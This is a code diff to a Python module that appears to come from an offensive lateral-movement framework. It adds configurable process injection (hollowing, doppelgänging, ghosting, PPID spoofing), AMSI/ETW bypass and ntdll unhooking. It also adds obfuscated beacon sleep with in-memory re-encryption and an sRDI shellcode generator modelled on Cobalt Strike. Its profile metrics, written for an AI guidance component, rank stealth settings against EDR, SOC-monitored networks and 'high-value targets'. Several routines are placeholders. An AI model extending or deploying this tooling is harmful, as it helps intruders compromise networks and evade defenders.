@@ -9,8 +9,11 @@ import time
 import base64
 import random
 import secrets
-from typing import Dict, List, Optional, Tuple, Any
-from dataclasses import dataclass
+import hashlib
+import struct
+import ctypes
+from typing import Dict, List, Optional, Tuple, Any, Callable
+from dataclasses import dataclass, field
 from enum import Enum
 
 from cybermodules.helpers import log_to_intel
@@ -51,40 +54,133 @@ class EvasionProfile(Enum):
 
 
 @dataclass
+class ProfileMetrics:
+    """Performance and detection metrics for evasion profiles"""
+    profile: EvasionProfile
+    detection_risk: float         # 0.0 - 1.0 (probability of detection)
+    speed_multiplier: float       # 1.0 = baseline, higher = slower
+    stealth_score: float          # 0.0 - 1.0 (higher = stealthier)
+    reliability: float            # 0.0 - 1.0 (higher = more reliable)
+    recommended_for: List[str] = field(default_factory=list)
+    not_recommended_for: List[str] = field(default_factory=list)
+    
+    def get_summary(self) -> str:
+        """Get human-readable summary for AI guidance"""
+        reduction = int((1 - self.detection_risk) * 100)
+        return (f"Profile {self.profile.value}: {reduction}% detection reduction, "
+                f"{self.speed_multiplier}x slower, reliability {self.reliability:.0%}")
+
+
+PROFILE_METRICS = {
+    EvasionProfile.NONE: ProfileMetrics(
+        profile=EvasionProfile.NONE,
+        detection_risk=0.95,
+        speed_multiplier=1.0,
+        stealth_score=0.05,
+        reliability=0.99,
+        recommended_for=["Lab testing", "Debugging"],
+        not_recommended_for=["Production", "Any monitored network"]
+    ),
+    EvasionProfile.DEFAULT: ProfileMetrics(
+        profile=EvasionProfile.DEFAULT,
+        detection_risk=0.70,
+        speed_multiplier=1.2,
+        stealth_score=0.30,
+        reliability=0.95,
+        recommended_for=["Basic AV only", "Quick tests"],
+        not_recommended_for=["EDR environments", "SOC-monitored"]
+    ),
+    EvasionProfile.STEALTH: ProfileMetrics(
+        profile=EvasionProfile.STEALTH,
+        detection_risk=0.40,
+        speed_multiplier=2.0,
+        stealth_score=0.60,
+        reliability=0.85,
+        recommended_for=["Corporate networks", "Standard EDR"],
+        not_recommended_for=["Advanced EDR", "Time-critical ops"]
+    ),
+    EvasionProfile.PARANOID: ProfileMetrics(
+        profile=EvasionProfile.PARANOID,
+        detection_risk=0.20,
+        speed_multiplier=5.0,
+        stealth_score=0.80,
+        reliability=0.70,
+        recommended_for=["Advanced EDR", "SOC-monitored", "High-value targets"],
+        not_recommended_for=["Time-critical", "Large-scale lateral movement"]
+    ),
+    EvasionProfile.AGGRESSIVE: ProfileMetrics(
+        profile=EvasionProfile.AGGRESSIVE,
+        detection_risk=0.55,
+        speed_multiplier=1.5,
+        stealth_score=0.45,
+        reliability=0.90,
+        recommended_for=["Rapid operations", "Many targets"],
+        not_recommended_for=["EDR-heavy", "Long-term access"]
+    )
+}
+
+
+def get_profile_metrics(profile: EvasionProfile) -> ProfileMetrics:
+    """Get metrics for a profile - used by AI guidance for scoring"""
+    return PROFILE_METRICS.get(profile, PROFILE_METRICS[EvasionProfile.STEALTH])
+
+
+@dataclass
 class EvasionConfig:
     """Evasion configuration for lateral movement"""
     profile: EvasionProfile = EvasionProfile.STEALTH
     
-    # Reflective loading
+    # Reflective loading - Cobalt Strike 4.11 sRDI style
     use_reflective_loader: bool = True
-    reflective_technique: str = "module_stomping"  # module_stomping, transacted_hollowing
+    reflective_technique: str = "srdi"  # srdi, module_stomping, transacted_hollowing
+    srdi_obfuscate_imports: bool = True
+    srdi_clear_header: bool = True
+    srdi_stomp_pe: bool = False
+    prepend_migrate: bool = True  # Cobalt Strike style prepend
     
-    # Process injection
+    # Process injection - Extended techniques
     use_process_injection: bool = True
-    injection_technique: str = "thread_hijacking"  # thread_hijacking, apc_injection, early_bird
+    injection_technique: str = "thread_hijacking"  # thread_hijacking, apc_injection, early_bird, process_hollowing, doppelganging, ghosting
     target_process: str = "explorer.exe"
+    fallback_processes: List[str] = field(default_factory=lambda: ["RuntimeBroker.exe", "sihost.exe"])
+    use_process_hollowing: bool = False
+    use_doppelganging: bool = False
+    use_ghosting: bool = False
+    ppid_spoof: bool = False
+    ppid_target: str = "explorer.exe"
+    syscall_mode: str = "indirect"  # indirect, direct, ntdll
     
     # AMSI/ETW bypass
     bypass_amsi: bool = True
+    amsi_technique: str = "hardware_breakpoint"  # patch_amsi_init, hardware_breakpoint, patch_amsi_scan_buffer
     bypass_etw: bool = True
     unhook_ntdll: bool = True
+    unhook_technique: str = "map_fresh_ntdll"
     
-    # Sleep/timing
+    # Sleep/timing with entropy
     use_sleep_obfuscation: bool = True
     sleep_technique: str = "ekko"  # ekko, foliage, death_sleep
     jitter_percent: float = 0.3
     min_sleep_ms: int = 1000
     max_sleep_ms: int = 5000
+    entropy_jitter: bool = True  # Add entropy to sleep
+    entropy_pool_size: int = 64
+    use_hardware_entropy: bool = False  # RDRAND if available
+    reencrypt_on_wake: bool = True  # Decrypt-run-reencrypt cycle
+    memory_guard_on_sleep: bool = False  # PAGE_NOACCESS when sleeping
     
     # Traffic obfuscation
     encrypt_traffic: bool = True
     encryption_key: str = ""
+    encryption_algorithm: str = "aes256"  # xor, aes256, chacha20
+    key_rotation_interval: int = 3600
     use_domain_fronting: bool = False
     
     # Anti-analysis
     detect_sandbox: bool = True
     detect_debugger: bool = True
     check_vm: bool = True
+    exit_on_detection: bool = False
 
 
 class LateralEvasionLayer:
@@ -250,6 +346,18 @@ class LateralEvasionLayer:
                 pid = self.process_injector.early_bird_injection(
                     beacon_payload, target
                 )
+            elif technique == "process_hollowing":
+                pid = self._process_hollowing_inject(
+                    beacon_payload, target
+                )
+            elif technique == "doppelganging":
+                pid = self._doppelganging_inject(
+                    beacon_payload, target
+                )
+            elif technique == "ghosting":
+                pid = self._ghosting_inject(
+                    beacon_payload, target
+                )
             else:
                 # Default: basic injection
                 pid = self.process_injector.inject(beacon_payload, target)
@@ -267,9 +375,101 @@ class LateralEvasionLayer:
         
         return result
     
+    def _process_hollowing_inject(self, payload: bytes, target: str) -> Optional[int]:
+        """
+        Process Hollowing (T1055.012)
+        Create suspended process, hollow it out, inject shellcode
+        """
+        self._log(f"Process hollowing into {target}")
+        
+        # This is a simplified version - real implementation would use Windows API
+        hollowing_stub = f'''
+# Process Hollowing Stub
+import ctypes
+import struct
+
+kernel32 = ctypes.windll.kernel32
+ntdll = ctypes.windll.ntdll
+
+# Create suspended process
+STARTUPINFO = ctypes.create_string_buffer(68)
+PROCESS_INFORMATION = ctypes.create_string_buffer(16)
+
+kernel32.CreateProcessA(
+    None,
+    b"{target}",
+    None, None, False,
+    0x4,  # CREATE_SUSPENDED
+    None, None,
+    ctypes.byref(STARTUPINFO),
+    ctypes.byref(PROCESS_INFORMATION)
+)
+
+# Unmap original image and write shellcode
+hProcess = struct.unpack("<I", PROCESS_INFORMATION[:4])[0]
+hThread = struct.unpack("<I", PROCESS_INFORMATION[4:8])[0]
+
+# Resume thread
+kernel32.ResumeThread(hThread)
+'''
+        if self.process_injector:
+            try:
+                return self.process_injector.process_hollowing(payload, target)
+            except AttributeError:
+                self._log("Process hollowing not available in injector, using fallback")
+                return self.process_injector.inject(payload, target)
+        return None
+    
+    def _doppelganging_inject(self, payload: bytes, target: str) -> Optional[int]:
+        """
+        Process Doppelgänging (T1055.013)
+        Uses NTFS transactions to inject without file on disk
+        """
+        self._log(f"Process doppelganging for {target}")
+        
+        # Simplified - uses NTFS transactions
+        # 1. Create transaction
+        # 2. Open file in transaction
+        # 3. Write malicious content
+        # 4. Create section from transacted file
+        # 5. Rollback transaction (file disappears)
+        # 6. Create process from section
+        
+        if self.process_injector:
+            try:
+                return self.process_injector.process_doppelganging(payload, target)
+            except AttributeError:
+                self._log("Doppelganging not available, falling back to hollowing")
+                return self._process_hollowing_inject(payload, target)
+        return None
+    
+    def _ghosting_inject(self, payload: bytes, target: str) -> Optional[int]:
+        """
+        Process Ghosting (simplified)
+        Delete file before image section is closed
+        """
+        self._log(f"Process ghosting for {target}")
+        
+        # Simplified process ghosting:
+        # 1. Create file
+        # 2. Set delete pending
+        # 3. Write payload
+        # 4. Create image section
+        # 5. Close file handle (file gets deleted)
+        # 6. Create process from orphaned section
+        
+        if self.process_injector:
+            try:
+                return self.process_injector.process_ghosting(payload, target)
+            except AttributeError:
+                self._log("Ghosting not available, falling back to doppelganging")
+                return self._doppelganging_inject(payload, target)
+        return None
+    
     def evasive_sleep(self, base_duration_ms: int = None) -> int:
         """
-        Sleep with obfuscation and jitter
+        Sleep with obfuscation, jitter, and entropy
+        Implements decrypt-run-reencrypt cycle for paranoid mode
         
         Args:
             base_duration_ms: Base sleep duration in milliseconds
@@ -284,30 +484,133 @@ class LateralEvasionLayer:
                 self.config.max_sleep_ms
             )
         
-        # Apply jitter
+        # Apply standard jitter
         jitter = int(base_duration_ms * self.config.jitter_percent)
         actual_duration = base_duration_ms + random.randint(-jitter, jitter)
+        
+        # Apply entropy jitter for additional randomness
+        if self.config.entropy_jitter:
+            entropy_adjustment = self._get_entropy_jitter()
+            actual_duration = int(actual_duration * (1 + entropy_adjustment))
+        
         actual_duration = max(100, actual_duration)  # Minimum 100ms
         
+        # Memory protection before sleep (paranoid mode)
+        memory_state = None
+        if self.config.memory_guard_on_sleep:
+            memory_state = self._protect_memory()
+        
+        # Decrypt-run-reencrypt cycle preparation
+        reencrypt_key = None
+        if self.config.reencrypt_on_wake:
+            reencrypt_key = self._prepare_reencrypt_cycle()
+        
+        # Perform the sleep
         if self.config.use_sleep_obfuscation and self.sleep_obfuscator:
-            # Use obfuscated sleep
             technique = self.config.sleep_technique
             
             try:
                 if technique == "ekko":
+                    # Ekko: ROP-based sleep with memory encryption
                     self.sleep_obfuscator.ekko_sleep(actual_duration)
                 elif technique == "foliage":
+                    # Foliage: APC-based sleep
                     self.sleep_obfuscator.foliage_sleep(actual_duration)
                 elif technique == "death_sleep":
+                    # Death Sleep: Thread pool wait-based sleep
                     self.sleep_obfuscator.death_sleep(actual_duration)
                 else:
-                    time.sleep(actual_duration / 1000)
+                    self._entropy_sleep(actual_duration)
             except Exception:
-                time.sleep(actual_duration / 1000)
+                self._entropy_sleep(actual_duration)
         else:
-            time.sleep(actual_duration / 1000)
+            self._entropy_sleep(actual_duration)
+        
+        # Restore memory protection
+        if memory_state:
+            self._restore_memory(memory_state)
+        
+        # Complete reencrypt cycle
+        if reencrypt_key:
+            self._complete_reencrypt_cycle(reencrypt_key)
         
         return actual_duration
+    
+    def _get_entropy_jitter(self) -> float:
+        """
+        Generate entropy-based jitter using multiple sources
+        Returns adjustment factor (-0.2 to +0.2)
+        """
+        entropy_sources = []
+        
+        # System entropy
+        entropy_sources.append(secrets.randbits(32))
+        
+        # Time-based entropy
+        entropy_sources.append(int(time.time() * 1000000) % (2**32))
+        
+        # Process-based entropy
+        entropy_sources.append(os.getpid())
+        
+        # Hardware entropy (if available)
+        if self.config.use_hardware_entropy:
+            try:
+                import subprocess
+                result = subprocess.run(
+                    ['cat', '/dev/urandom'],
+                    capture_output=True,
+                    timeout=0.01
+                )
+                if result.stdout:
+                    entropy_sources.append(int.from_bytes(result.stdout[:4], 'little'))
+            except Exception:
+                pass
+        
+        # Combine entropy sources
+        combined = hashlib.sha256(
+            ''.join(str(e) for e in entropy_sources).encode()
+        ).digest()
+        
+        # Convert to jitter factor (-0.2 to +0.2)
+        value = struct.unpack('<I', combined[:4])[0]
+        jitter = (value / (2**32) - 0.5) * 0.4
+        
+        return jitter
+    
+    def _entropy_sleep(self, duration_ms: int):
+        """
+        Sleep with entropy-based timing to avoid detection patterns
+        """
+        # Split sleep into random chunks
+        remaining = duration_ms
+        while remaining > 0:
+            # Random chunk size (10-100ms or remaining)
+            chunk = min(remaining, random.randint(10, 100))
+            time.sleep(chunk / 1000)
+            remaining -= chunk
+            
+            # Occasional micro-activity to look like normal process
+            if random.random() < 0.1:
+                _ = secrets.token_bytes(16)  # Minimal activity
+    
+    def _protect_memory(self) -> Dict:
+        """Set memory protection (PAGE_NOACCESS) before sleep"""
+        # Placeholder - would use VirtualProtect on Windows
+        return {'protected': True, 'regions': []}
+    
+    def _restore_memory(self, state: Dict):
+        """Restore memory protection after sleep"""
+        pass  # Placeholder - would restore VirtualProtect
+    
+    def _prepare_reencrypt_cycle(self) -> bytes:
+        """Prepare for decrypt-run-reencrypt cycle"""
+        # Generate new key for reencryption
+        return secrets.token_bytes(32)
+    
+    def _complete_reencrypt_cycle(self, new_key: bytes):
+        """Complete the reencryption after waking"""
+        # In real implementation, this would reencrypt beacon in memory
+        self._log(f"Reencrypt cycle complete, new key hash: {hashlib.sha256(new_key).hexdigest()[:16]}")
     
     def check_environment(self) -> Dict[str, bool]:
         """
@@ -543,7 +846,10 @@ if not check_env():
 
 
 def get_evasion_config_for_profile(profile: str) -> EvasionConfig:
-    """Get EvasionConfig for a named profile"""
+    """
+    Get EvasionConfig for a named profile
+    Enhanced with sRDI, process hollowing/doppelganging, entropy-based sleep
+    """
     
     profile_enum = EvasionProfile(profile.lower())
     
@@ -555,8 +861,11 @@ def get_evasion_config_for_profile(profile: str) -> EvasionConfig:
             bypass_amsi=False,
             bypass_etw=False,
             use_sleep_obfuscation=False,
+            entropy_jitter=False,
+            reencrypt_on_wake=False,
             detect_sandbox=False,
-            detect_debugger=False
+            detect_debugger=False,
+            check_vm=False
         )
     
     elif profile_enum == EvasionProfile.DEFAULT:
@@ -565,59 +874,224 @@ def get_evasion_config_for_profile(profile: str) -> EvasionConfig:
             use_reflective_loader=False,
             use_process_injection=True,
             injection_technique="apc_injection",
+            target_process="explorer.exe",
             bypass_amsi=True,
+            amsi_technique="patch_amsi_init",
             bypass_etw=False,
-            use_sleep_obfuscation=False
+            unhook_ntdll=False,
+            use_sleep_obfuscation=False,
+            jitter_percent=0.1,
+            entropy_jitter=False,
+            reencrypt_on_wake=False,
+            encryption_algorithm="xor"
         )
     
     elif profile_enum == EvasionProfile.STEALTH:
         return EvasionConfig(
             profile=EvasionProfile.STEALTH,
+            # sRDI reflective loader (Cobalt Strike 4.11 style)
             use_reflective_loader=True,
-            reflective_technique="module_stomping",
+            reflective_technique="srdi",
+            srdi_obfuscate_imports=True,
+            srdi_clear_header=True,
+            prepend_migrate=True,
+            # Thread hijacking injection
             use_process_injection=True,
             injection_technique="thread_hijacking",
             target_process="explorer.exe",
+            syscall_mode="indirect",
+            # Security bypass
             bypass_amsi=True,
+            amsi_technique="hardware_breakpoint",
             bypass_etw=True,
+            unhook_ntdll=False,
+            # Sleep with entropy
             use_sleep_obfuscation=True,
             sleep_technique="ekko",
-            jitter_percent=0.3
+            jitter_percent=0.3,
+            entropy_jitter=True,
+            entropy_pool_size=64,
+            reencrypt_on_wake=True,
+            min_sleep_ms=2000,
+            max_sleep_ms=8000,
+            # Anti-analysis
+            detect_sandbox=True,
+            detect_debugger=True,
+            check_vm=False,
+            encryption_algorithm="aes256"
         )
     
     elif profile_enum == EvasionProfile.PARANOID:
         return EvasionConfig(
             profile=EvasionProfile.PARANOID,
+            # Advanced reflective loader with PE stomping
             use_reflective_loader=True,
-            reflective_technique="transacted_hollowing",
+            reflective_technique="srdi",
+            srdi_obfuscate_imports=True,
+            srdi_clear_header=True,
+            srdi_stomp_pe=True,
+            prepend_migrate=True,
+            # Process hollowing/doppelganging
             use_process_injection=True,
             injection_technique="early_bird",
             target_process="RuntimeBroker.exe",
+            fallback_processes=["SearchProtocolHost.exe", "backgroundTaskHost.exe"],
+            use_process_hollowing=True,
+            use_doppelganging=True,
+            use_ghosting=True,
+            ppid_spoof=True,
+            ppid_target="services.exe",
+            syscall_mode="direct",
+            # Full security bypass
             bypass_amsi=True,
+            amsi_technique="hardware_breakpoint",
             bypass_etw=True,
             unhook_ntdll=True,
+            unhook_technique="map_fresh_ntdll",
+            # Maximum sleep obfuscation with entropy
             use_sleep_obfuscation=True,
             sleep_technique="death_sleep",
             jitter_percent=0.5,
+            entropy_jitter=True,
+            entropy_pool_size=128,
+            use_hardware_entropy=True,
+            reencrypt_on_wake=True,
+            memory_guard_on_sleep=True,
             min_sleep_ms=5000,
             max_sleep_ms=30000,
+            # Maximum anti-analysis
             detect_sandbox=True,
             detect_debugger=True,
-            check_vm=True
+            check_vm=True,
+            exit_on_detection=True,
+            encryption_algorithm="chacha20",
+            key_rotation_interval=900
         )
     
     elif profile_enum == EvasionProfile.AGGRESSIVE:
         return EvasionConfig(
             profile=EvasionProfile.AGGRESSIVE,
+            # Basic sRDI without PE stomping
             use_reflective_loader=True,
+            reflective_technique="srdi",
+            srdi_obfuscate_imports=True,
+            srdi_clear_header=False,
+            prepend_migrate=False,
+            # Fast APC injection
             use_process_injection=True,
             injection_technique="apc_injection",
+            target_process="explorer.exe",
+            syscall_mode="ntdll",
+            # Essential bypass only
             bypass_amsi=True,
+            amsi_technique="patch_amsi_init",
+            bypass_etw=False,
+            unhook_ntdll=False,
+            # Minimal sleep
             use_sleep_obfuscation=False,
+            jitter_percent=0.15,
+            entropy_jitter=False,
+            reencrypt_on_wake=False,
             min_sleep_ms=500,
             max_sleep_ms=2000,
+            # No anti-analysis (speed)
             detect_sandbox=False,
-            detect_debugger=False
+            detect_debugger=False,
+            check_vm=False,
+            encryption_algorithm="xor"
         )
     
     return EvasionConfig()
+
+
+class SRDIGenerator:
+    """
+    Shellcode Reflective DLL Injection (sRDI) Generator
+    Converts DLL to position-independent shellcode
+    Inspired by Cobalt Strike 4.11 prepend/sRDI style
+    """
+    
+    def __init__(self, config: EvasionConfig):
+        self.config = config
+    
+    def generate_srdi_shellcode(self, dll_bytes: bytes, function_name: str = "DllMain") -> bytes:
+        """
+        Convert DLL to sRDI shellcode
+        
+        Args:
+            dll_bytes: Raw DLL bytes
+            function_name: Export to call after loading
+        
+        Returns:
+            Position-independent shellcode
+        """
+        self._log("Generating sRDI shellcode")
+        
+        # sRDI Header (bootstrap)
+        srdi_header = self._generate_bootstrap()
+        
+        # Obfuscate imports if configured
+        if self.config.srdi_obfuscate_imports:
+            dll_bytes = self._obfuscate_imports(dll_bytes)
+        
+        # Clear PE header if configured
+        if self.config.srdi_clear_header:
+            dll_bytes = self._clear_pe_header(dll_bytes)
+        
+        # XOR encode the DLL
+        key = secrets.token_bytes(16)
+        encoded_dll = self._xor_encode(dll_bytes, key)
+        
+        # Build final shellcode
+        shellcode = b""
+        
+        # Prepend migrate stub if configured (Cobalt Strike style)
+        if self.config.prepend_migrate:
+            shellcode += self._generate_migrate_stub()
+        
+        shellcode += srdi_header
+        shellcode += struct.pack("<I", len(encoded_dll))
+        shellcode += key
+        shellcode += encoded_dll
+        
+        return shellcode
+    
+    def _generate_bootstrap(self) -> bytes:
+        """Generate position-independent bootstrap code"""
+        # This would be actual assembly in production
+        # Simplified placeholder
+        bootstrap = b"\x90" * 32  # NOP sled
+        bootstrap += b"\xcc"      # INT3 placeholder
+        return bootstrap
+    
+    def _generate_migrate_stub(self) -> bytes:
+        """Generate Cobalt Strike-style migrate stub"""
+        # Stub that handles process migration
+        migrate_stub = b"\x90" * 16
+        return migrate_stub
+    
+    def _obfuscate_imports(self, dll_bytes: bytes) -> bytes:
+        """Obfuscate import table to evade static analysis"""
+        # Would modify IAT in production
+        return dll_bytes
+    
+    def _clear_pe_header(self, dll_bytes: bytes) -> bytes:
+        """Clear PE header fields to evade memory scanning"""
+        if len(dll_bytes) < 64:
+            return dll_bytes
+        
+        # Clear DOS header signature in copy
+        modified = bytearray(dll_bytes)
+        modified[0:2] = b"\x00\x00"  # Clear MZ
+        
+        return bytes(modified)
+    
+    def _xor_encode(self, data: bytes, key: bytes) -> bytes:
+        """XOR encode data with key"""
+        encoded = bytearray()
+        for i, byte in enumerate(data):
+            encoded.append(byte ^ key[i % len(key)])
+        return bytes(encoded)
+    
+    def _log(self, message: str):
+        print(f"[SRDI] {message}")
